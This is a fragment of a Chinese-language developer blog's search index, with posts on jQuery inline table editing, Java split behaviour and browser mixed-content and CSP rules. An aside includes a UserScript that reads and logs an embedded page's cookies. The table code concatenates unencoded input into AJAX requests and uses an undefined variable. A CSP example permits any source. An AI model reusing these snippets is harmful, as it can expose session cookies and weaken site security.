href=\"https://godleon.github.io/blog/Elasticsearch/Elasticsearch-getting-started/\" target=\"_blank\" rel=\"noopener\">[Elasticsearch] 基本概念 &amp; 搜尋入門 | 小信豬的原始部落</a></p>\n","categories":["ELK"],"tags":["elasticsearch","logstash","kibana","filebeat"]},{"title":"實用快速改table資料方法","url":"/blog/2018/10/20/%E5%AF%A6%E7%94%A8%E5%BF%AB%E9%80%9F%E6%94%B9table%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/","content":"<p>最近看到一種很神奇的寫法<br>在這邊簡單記錄一下</p>\n<a id=\"more\"></a>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>AA<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>BB<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>CC<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>DD<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>EE<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>項目1<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"AA\"</span>&gt;</span>AA<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"BB\"</span>&gt;</span>BB<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"CC\"</span>&gt;</span>CC<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"DD\"</span>&gt;</span>DD<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"EE\"</span>&gt;</span>EE<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>項目2<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"AA\"</span>&gt;</span>AA<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"BB\"</span>&gt;</span>BB<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"CC\"</span>&gt;</span>CC<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"DD\"</span>&gt;</span>DD<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"EE\"</span>&gt;</span>EE<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>項目2<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"AA\"</span>&gt;</span>AA<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"BB\"</span>&gt;</span>BB<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"CC\"</span>&gt;</span>CC<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"DD\"</span>&gt;</span>DD<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">class</span>=<span class=\"string\">\"EE\"</span>&gt;</span>EE<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'table td'</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!$(<span class=\"keyword\">this</span>).is(<span class=\"string\">'.input'</span>))&#123;    </span><br><span class=\"line\">        $(<span class=\"keyword\">this</span>).addClass(<span class=\"string\">'input'</span>).html(<span class=\"string\">'&lt;input type=\"text\" value=\"'</span>+ $(<span class=\"keyword\">this</span>).text() +<span class=\"string\">'\" /&gt;'</span>).find(<span class=\"string\">'input'</span>).focus().blur(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">            <span class=\"keyword\">var</span> id = $(<span class=\"keyword\">this</span>).parent().siblings(<span class=\"string\">\"th:eq(0)\"</span>).text();    </span><br><span class=\"line\">            <span class=\"keyword\">var</span> thisclass = $(<span class=\"keyword\">this</span>).parent().attr(<span class=\"string\">\"class\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> thisvalue=$(<span class=\"keyword\">this</span>).val();    </span><br><span class=\"line\">             </span><br><span class=\"line\">            $.ajax(&#123;    </span><br><span class=\"line\">              type: <span class=\"string\">'POST'</span>,    </span><br><span class=\"line\">              url: <span class=\"string\">'update'</span>,    </span><br><span class=\"line\">              data: <span class=\"string\">\"id=\"</span>+id+<span class=\"string\">\"&amp;thisclass=\"</span>+thisclass+<span class=\"string\">\"&amp;thisvalue=\"</span>+thisvalue,</span><br><span class=\"line\">            &#125;);    </span><br><span class=\"line\">            $(<span class=\"keyword\">this</span>).parent().removeClass(<span class=\"string\">'input'</span>).html($(<span class=\"keyword\">this</span>).val() || <span class=\"number\">0</span>);    </span><br><span class=\"line\">        &#125;);                        </span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;).hover(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">    $(<span class=\"keyword\">this</span>).addClass(<span class=\"string\">'hover'</span>);    </span><br><span class=\"line\">&#125;,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">    $(<span class=\"keyword\">this</span>).removeClass(<span class=\"string\">'hover'</span>);    </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>看到這個寫法，覺得他還缺少了存檔驗證<br>所以修改程式碼<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'table td'</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">var</span> source_text = $(<span class=\"keyword\">this</span>).text();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$(<span class=\"keyword\">this</span>).is(<span class=\"string\">'.input'</span>))&#123;    </span><br><span class=\"line\">    $(<span class=\"keyword\">this</span>).addClass(<span class=\"string\">'input'</span>).html(<span class=\"string\">'&lt;input type=\"text\" value=\"'</span>+ $(<span class=\"keyword\">this</span>).text() +<span class=\"string\">'\" /&gt;'</span>).find(<span class=\"string\">'input'</span>).focus().blur(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (source_text == $(<span class=\"keyword\">this</span>).val())&#123;   </span><br><span class=\"line\">            $(<span class=\"keyword\">this</span>).parent().removeClass(<span class=\"string\">'input'</span>).html($(<span class=\"keyword\">this</span>).val() || <span class=\"number\">0</span>);    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;).change(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (source_text == $(<span class=\"keyword\">this</span>).val()) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">var</span> id = $(<span class=\"keyword\">this</span>).parent().siblings(<span class=\"string\">\"th:eq(0)\"</span>).text();    </span><br><span class=\"line\">                <span class=\"keyword\">var</span> thisclass = $(<span class=\"keyword\">this</span>).parent().attr(<span class=\"string\">\"class\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> thisvalue=$(<span class=\"keyword\">this</span>).val();    </span><br><span class=\"line\">         </span><br><span class=\"line\">        $.ajax(&#123;    </span><br><span class=\"line\">          type: <span class=\"string\">'POST'</span>,    </span><br><span class=\"line\">          url: <span class=\"string\">'update.php'</span>,    </span><br><span class=\"line\">          data: <span class=\"string\">\"thisid=\"</span>+thisid+<span class=\"string\">\"&amp;thisclass=\"</span>+thisclass+<span class=\"string\">\"&amp;thisvalue=\"</span>+thisvalue,</span><br><span class=\"line\">          success:<span class=\"function\"><span class=\"params\">()</span>=&gt;</span>&#123;</span><br><span class=\"line\">            $(<span class=\"keyword\">this</span>).parent().removeClass(<span class=\"string\">'input'</span>).html($(<span class=\"keyword\">this</span>).val() || <span class=\"number\">0</span>);   </span><br><span class=\"line\">          &#125;,</span><br><span class=\"line\">          error:<span class=\"function\"><span class=\"params\">()</span>=&gt;</span>&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'更新失敗'</span>);</span><br><span class=\"line\">            $(<span class=\"keyword\">this</span>).parent().removeClass(<span class=\"string\">'input'</span>).html(source_text || <span class=\"number\">0</span>);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;);    </span><br><span class=\"line\">    &#125;);                        </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\">&#125;).hover(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">$(<span class=\"keyword\">this</span>).addClass(<span class=\"string\">'hover'</span>);    </span><br><span class=\"line\">&#125;,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;    </span><br><span class=\"line\">$(<span class=\"keyword\">this</span>).removeClass(<span class=\"string\">'hover'</span>);    </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>PHP部份就不寫了，其實可以不要用<code>class</code>來當改db名字<br>不然還要多處理class 後面加的不份<br>用<code>class</code>還需PHP後端還需要<code>split</code>空白過濾之後的東西</p>\n<p>PHP回傳錯誤，這樣能讓ajax進入error function<br><a href=\"http://php.net/manual/en/function.http-response-code.php\" target=\"_blank\" rel=\"noopener\">PHP: http_response_code - Manual</a></p>\n","categories":["網頁"],"tags":["html","js"]},{"title":"寫程式使用 split 切割不會注意到的陷阱","url":"/blog/2020/10/28/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/","content":"<p>最近 JAVA 程式遇到一個奇怪錯誤<br>使用 split 針對 data 做分割<br>切割符號為 ^<br>最後發現是後面空白會合併空白</p>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span> </span>&#123;</span><br><span class=\"line\">        String str = <span class=\"keyword\">new</span> String(<span class=\"string\">\"1^^2^^^3^4^5^^^^\"</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"^ 分隔符返回值 :\"</span> );</span><br><span class=\"line\">        <span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String retval: str.split(<span class=\"string\">\"\\\\^\"</span>))&#123;</span><br><span class=\"line\">            System.out.println((index++) + <span class=\"string\">\":\"</span> + retval);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>得到結果會是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">^ 分隔符返回值 :</span><br><span class=\"line\">0:1</span><br><span class=\"line\">1:</span><br><span class=\"line\">2:2</span><br><span class=\"line\">3:</span><br><span class=\"line\">4:</span><br><span class=\"line\">5:3</span><br><span class=\"line\">6:4</span><br><span class=\"line\">7:5</span><br></pre></td></tr></table></figure>\n<p>後面的^資料都是空白的話，都不會在陣列</p>\n<p>我一直以為別的程式語言也是這樣</p>\n<h2 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h2><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"1^2^3^4^5^^^^\"</span>.split(<span class=\"string\">'^'</span>)</span><br><span class=\"line\"><span class=\"comment\">// Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ]</span></span><br></pre></td></tr></table></figure>\n<p>等一下，Java 這邊好像是用 Regex<br>馬上找一下方法嘗試</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"1^2^3^4^5^^^^\"</span>.split(<span class=\"regexp\">/\\^/</span>)</span><br><span class=\"line\"><span class=\"comment\">// Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ]</span></span><br></pre></td></tr></table></figure>\n<p>結果還是一樣</p>\n<h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">var_dump(explode(<span class=\"string\">\"^\"</span>,<span class=\"string\">\"1^2^3^4^5^^^^\"</span>));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">var_dump( preg_split(<span class=\"string\">\"/\\\\^/\"</span>, <span class=\"string\">\"1^2^3^4^5^^^^\"</span>));</span><br></pre></td></tr></table></figure>\n<p>都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(9) &#123;</span><br><span class=\"line\">  [0]=&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]=&gt;</span><br><span class=\"line\">  string(1) &quot;2&quot;</span><br><span class=\"line\">  [2]=&gt;</span><br><span class=\"line\">  string(1) &quot;3&quot;</span><br><span class=\"line\">  [3]=&gt;</span><br><span class=\"line\">  string(1) &quot;4&quot;</span><br><span class=\"line\">  [4]=&gt;</span><br><span class=\"line\">  string(1) &quot;5&quot;</span><br><span class=\"line\">  [5]=&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [6]=&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [7]=&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [8]=&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"結果\"><a href=\"#結果\" class=\"headerlink\" title=\"結果\"></a>結果</h2><p>Java 處理 Split 機制不太一樣<br>這邊可以看看 split 可以帶第二個參數</p>\n<p><a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split(java.lang.String,%20int\" target=\"_blank\" rel=\"noopener\">String (Java Platform SE 7 )</a>)</p>\n<h3 id=\"String-split-與com-sun-deploy-util-StringUtils-split-的區別\"><a href=\"#String-split-與com-sun-deploy-util-StringUtils-split-的區別\" class=\"headerlink\" title=\"String.split()與com.sun.deploy.util.StringUtils.split()的區別\"></a>String.split()與com.sun.deploy.util.StringUtils.split()的區別</h3><p><a href=\"https://blog.csdn.net/csdm_admin/article/details/68483417\" target=\"_blank\" rel=\"noopener\">String.split()与StringUtils.split()的区别_卡卡_西瓜的博客-CSDN博客</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.deploy.util.StringUtils;</span><br><span class=\"line\">String s =<span class=\"string\">\",1,,2,3,4,,\"</span>;</span><br><span class=\"line\">String[] split1 = s.split(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">String[] split2 = StringUtils.splitString(s, <span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 1,2,3,4</span></span><br></pre></td></tr></table></figure>\n<p>apache 結果會跟下面一樣</p>\n<h4 id=\"找到我們想要的\"><a href=\"#找到我們想要的\" class=\"headerlink\" title=\"找到我們想要的\"></a>找到我們想要的</h4><p>org.apache.commons.lang3.StringUtils#splitPreserveAllTokens(str, separatorChar)<br><a href=\"http://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/StringUtils.html#splitPreserveAllTokens-java.lang.String-char-\" target=\"_blank\" rel=\"noopener\">StringUtils (Apache Commons Lang 3.11 API)</a></p>\n<p>org.apache.commons.lang3.StringUtils#splitByWholeSeparatorPreserveAllTokens(str, separator)</p>\n<p>歡呼!!<br><a href=\"https://www.mofish.work/thread/4471\" target=\"_blank\" rel=\"noopener\">Java 有沒有像 Python 一樣的 split？ - \b摸鱼</a><br>看來還滿多人苦惱這個</p>\n<h3 id=\"詳細解說\"><a href=\"#詳細解說\" class=\"headerlink\" title=\"詳細解說\"></a>詳細解說</h3><p>有爬到這篇<a href=\"https://juejin.im/post/6844903966392713224\" target=\"_blank\" rel=\"noopener\">Java 字符串 split 踩坑记</a></p>\n<p> com.google.common.base.Splitter 這個比較是接近我們想要的</p>\n","categories":["Linux"],"tags":["linux","split"]},{"title":"對瀏覽器 混合內容（mixed content）的認識","url":"/blog/2019/11/06/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9%EF%BC%88mixed-content%EF%BC%89%E7%9A%84%E8%AA%8D%E8%AD%98/","content":"<p>我們常常在改 https 的時候會發現，css 跟 js 沒有調成 https:// 或 //<br>一些東西會沒有出來，正常 https 載 http (css js) 會失敗<br>但是 http 載入 https 也會失敗(Firefox)</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單實驗\"><a href=\"#簡單實驗\" class=\"headerlink\" title=\"簡單實驗\"></a>簡單實驗</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;title&gt;test&lt;/title&gt;</span><br><span class=\"line\">     &lt;link rel=&quot;stylesheet&quot; href=&quot;http://xxxx/css/reset.css&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">Hello World!!</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"http網頁-載-http-js-css-自動導-https\"><a href=\"#http網頁-載-http-js-css-自動導-https\" class=\"headerlink\" title=\"http網頁 載 http js ,css (自動導 https)\"></a>http網頁 載 http js ,css (自動導 https)</h3><p>順利執行</p>\n<h3 id=\"http-網頁-載-https-js-css\"><a href=\"#http-網頁-載-https-js-css\" class=\"headerlink\" title=\"http 網頁 載 https js css\"></a>http 網頁 載 https js css</h3><p><del>順利執行</del><br>Chrome 好像正常<br>但 Firefox 會有問題</p>\n<h3 id=\"https-網頁-載-http-js-css\"><a href=\"#https-網頁-載-http-js-css\" class=\"headerlink\" title=\"https 網頁 載 http js css\"></a>https 網頁 載 http js css</h3><p>已封鎖載入混和的主動內容「<a href=\"http://xxxx/css/reset.css」\" target=\"_blank\" rel=\"noopener\">http://xxxx/css/reset.css」</a></p>\n<h3 id=\"https-網頁-載-https-js-css\"><a href=\"#https-網頁-載-https-js-css\" class=\"headerlink\" title=\"https 網頁 載 https js css\"></a>https 網頁 載 https js css</h3><p>順利執行</p>\n<h3 id=\"實驗簡單總結\"><a href=\"#實驗簡單總結\" class=\"headerlink\" title=\"實驗簡單總結\"></a>實驗簡單總結</h3><p>簡單說 https 模式下 不能讀 http 東西，因為不被信任<br>可能會有網頁安全問題</p>\n<p>最佳使用方法<code>//xxxx/css/xxx.css</code>就不會有這個問題</p>\n<h2 id=\"混合內容（mixed-content）\"><a href=\"#混合內容（mixed-content）\" class=\"headerlink\" title=\"混合內容（mixed content）\"></a>混合內容（mixed content）</h2><p>主動型混合有分兩種</p>\n<ol>\n<li>被動/顯示型混合內容（mixed passive/display content）</li>\n<li>主動型混合內容（mixed active content）</li>\n</ol>\n<h3 id=\"被動-顯示型混合內容（mixed-passive-display-content）\"><a href=\"#被動-顯示型混合內容（mixed-passive-display-content）\" class=\"headerlink\" title=\"被動/顯示型混合內容（mixed passive/display content）\"></a>被動/顯示型混合內容（mixed passive/display content）</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">被動型混合內容清單</span><br><span class=\"line\"></span><br><span class=\"line\">以下列出會被視為被動型混合內容的 HTTP 請求：</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;img&gt;（src 屬性）</span><br><span class=\"line\">    &lt;audio&gt;（src 屬性）</span><br><span class=\"line\">    &lt;video&gt;（src 屬性）</span><br><span class=\"line\">    &lt;object&gt; subresource（如果 &lt;object&gt; 發起 HTTP 請求）</span><br></pre></td></tr></table></figure>\n<h3 id=\"主動型混合內容（mixed-active-content）\"><a href=\"#主動型混合內容（mixed-active-content）\" class=\"headerlink\" title=\"主動型混合內容（mixed active content）\"></a>主動型混合內容（mixed active content）</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">主動型混合內容示例</span><br><span class=\"line\"></span><br><span class=\"line\">以下列出會被視為主動型混合內容的 HTTP 請求：</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;script&gt;（src 屬性）</span><br><span class=\"line\">    &lt;link&gt;（href 屬性）（包含 CSS 樣式表）</span><br><span class=\"line\">    &lt;iframe&gt;（src 屬性）</span><br><span class=\"line\">    XMLHttpRequest 請求</span><br><span class=\"line\">    fetch() 請求</span><br><span class=\"line\">    所有用到 url 的 CSS 值（@font-face、cursor、background-image……等等）。</span><br><span class=\"line\">    &lt;object&gt;（data 屬性）</span><br></pre></td></tr></table></figure>\n<h3 id=\"簡單來說\"><a href=\"#簡單來說\" class=\"headerlink\" title=\"簡單來說\"></a>簡單來說</h3><p>原本想說怎麼分可以載入根不可以載入，爬了一下文章，安全性比較小是可以取得到資源，危險信高的可能不能執行!!</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">現代瀏覽器</span><br><span class=\"line\"></span><br><span class=\"line\">現代瀏覽器（Chrome、Firefox、Safari、Microsoft Edge），基本上都遵守了 W3C 的 Mixed Content 規範，將 Mixed Content 分為 Optionally-blockable 和 Blockable 兩類：</span><br><span class=\"line\"></span><br><span class=\"line\">Optionally-blockable 類 Mixed Content 包含那些危險較小，即使被中間人篡改也無大礙的資源。現代瀏覽器默認會加載這類資源，同時會在控制台打印警告信息。這類資源包括：</span><br><span class=\"line\"></span><br><span class=\"line\">    通過 &lt;img&gt; 標籤加載的圖片（包括 SVG 圖片）；</span><br><span class=\"line\">    通過 &lt;video&gt; / &lt;audio&gt; 和 &lt;source&gt; 標籤加載的視頻或音頻；</span><br><span class=\"line\">    預讀的（Prefetched）資源；</span><br><span class=\"line\"></span><br><span class=\"line\">除此之外所有的 Mixed Content 都是 Blockable，瀏覽器必須禁止加載這類資源。所以現代瀏覽器中，對於 HTTPS 頁面中的 JavaScript、CSS 等 HTTP 資源，一律不加載，直接在控制台打印錯誤信息。</span><br></pre></td></tr></table></figure>\n<p>參考: <a href=\"https://imququ.com/post/sth-about-switch-to-https.html\" target=\"_blank\" rel=\"noopener\">关于启用 HTTPS 的一些经验分享（一） | JerryQu 的小站</a></p>\n<h2 id=\"題外話-用-UserScript-方法\"><a href=\"#題外話-用-UserScript-方法\" class=\"headerlink\" title=\"題外話 用 UserScript 方法\"></a>題外話 用 UserScript 方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsafeWindow.document.body.innerHTML+=&apos;&lt;iframe src=&quot;https://xxxxxxxx&quot; width=&quot;640px&quot; height=&quot;400px&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&apos;;</span><br><span class=\"line\">console.log(unsafeWindow.frames[0].window.document.cookie);</span><br></pre></td></tr></table></figure>\n<h2 id=\"掃-混合內容（mixed-content）工具\"><a href=\"#掃-混合內容（mixed-content）工具\" class=\"headerlink\" title=\"掃 混合內容（mixed content）工具\"></a>掃 混合內容（mixed content）工具</h2><ul>\n<li><a href=\"https://httpschecker.net/guides/https-checker\" target=\"_blank\" rel=\"noopener\">HTTPS Checker Desktop App | HTTPS Checker</a></li>\n<li><a href=\"https://github.com/bramus/mixed-content-scan\" target=\"_blank\" rel=\"noopener\">GitHub - bramus/mixed-content-scan: Scan your HTTPS-enabled website for Mixed Content</a></li>\n</ul>\n<h2 id=\"讓內容能正常執行和預防方法\"><a href=\"#讓內容能正常執行和預防方法\" class=\"headerlink\" title=\"讓內容能正常執行和預防方法\"></a>讓內容能正常執行和預防方法</h2><p>一開始我已為這跟 CROS 問題類似，但這個完全是不一樣的東西。<br>但有類似解決方法。使用 CSP</p>\n<h3 id=\"CSP\"><a href=\"#CSP\" class=\"headerlink\" title=\"CSP\"></a>CSP</h3><p>這個網頁講的很詳細 <a href=\"https://hackmd.io/@Eotones/BkOX6u5kX\" target=\"_blank\" rel=\"noopener\">Content Security Policy (CSP) 筆記 - HackMD</a></p>\n<p>可以簡單用 .htaccess 測試<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;IfModule mod_headers.c&gt;</span><br><span class=\"line\">Header set Content-Security-Policy &quot; \\</span><br><span class=\"line\">    default-src &apos;self&apos; xxxxxxx; \\</span><br><span class=\"line\">    img-src &apos;self&apos; data:; \\</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></p>\n<p>任意網站可以使用 <code>default-src &#39;self&#39; *</code></p>\n<p><a href=\"https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/\" target=\"_blank\" rel=\"noopener\">Content-Security-Policy - HTTP Headers 的資安議題 (2) | DEVCORE 戴夫寇爾</a></p>\n<p>html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  